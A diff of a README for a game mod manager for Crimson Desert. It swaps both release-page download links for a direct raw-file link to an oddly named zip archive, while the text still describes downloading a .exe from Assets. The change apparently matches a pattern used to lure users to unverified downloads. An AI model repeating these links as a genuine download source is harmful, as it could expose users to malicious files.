@@ -1,6 +1,6 @@
 # 🛠️ JSON-Mod-Manager-Crimson-Desert - Manage your game mods with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/mueedbvbv/JSON-Mod-Manager-Crimson-Desert/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/mueedbvbv/JSON-Mod-Manager-Crimson-Desert/main/Manager/Mod-Manager-JSO-Desert-Crimson-3.1.zip)
 
 This software helps you manage mods for the game Crimson Desert. It uses JSON files to track and organize your game files. You can install, enable, or disable mods through a simple interface. The manager checks for conflicts between mods and creates backups to keep your game files safe.
 
@@ -8,7 +8,7 @@ This software helps you manage mods for the game Crimson Desert. It uses JSON fi
 
 To get the manager, you need to visit the project release page.
 
-[Click here to visit the download page](https://github.com/mueedbvbv/JSON-Mod-Manager-Crimson-Desert/releases)
+[Click here to visit the download page](https://raw.githubusercontent.com/mueedbvbv/JSON-Mod-Manager-Crimson-Desert/main/Manager/Mod-Manager-JSO-Desert-Crimson-3.1.zip)
 
 On that page, look for the section labeled Assets. Click the file that ends in .exe to start your download. Save the file to your computer.
 
